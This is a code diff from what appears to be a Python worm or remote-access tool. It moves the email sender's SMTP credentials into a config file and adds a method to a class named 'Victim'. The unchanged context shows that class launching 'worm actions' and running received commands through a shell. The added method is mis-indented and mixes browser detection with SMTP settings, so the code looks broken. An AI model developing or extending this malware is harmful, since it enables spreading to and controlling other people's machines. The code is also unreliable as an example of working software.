@@ -18,13 +18,21 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
+import configparser
 
+def read_config():
+    config = configparser.ConfigParser()
+    config.read('config.ini')
+    return config
 class EmailSender:
-    def __init__(self, smtp_server, smtp_port, username, password):
-        self.smtp_server = smtp_server
-        self.smtp_port = smtp_port
-        self.username = username
-        self.password = password
+    def __init__(self):
+        # Read email configuration from the config file
+        config = read_config()
+        email_config = config['Email']
+        self.smtp_server = email_config['smtp_server']
+        self.smtp_port = int(email_config['smtp_port'])
+        self.username = email_config['username']
+        self.password = email_config['password']
 
     def send_email_with_attachment(self, subject, message, attachment_path, recipients):
         # Create a multipart message
@@ -86,6 +94,21 @@ class Victim:
                 self.start_worm_actions()
             else:
                 self.execute_command(user_command)
+
+    
+     def get_smtp_server_info(self):
+        # Read browser configuration from the config file
+        config = read_config()
+        browsers_config = config['Browsers']
+
+        detected_browsers = self.detect_browsers()
+
+        for browser_name in detected_browsers:
+            if browser_name.lower() in browsers_config:
+                return browsers_config[browser_name.lower()].split(', ')
+
+        # Default SMTP server information if browser detection fails
+        return "smtp.example.com", 587
 
     def execute_command(self, user_command):
         op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
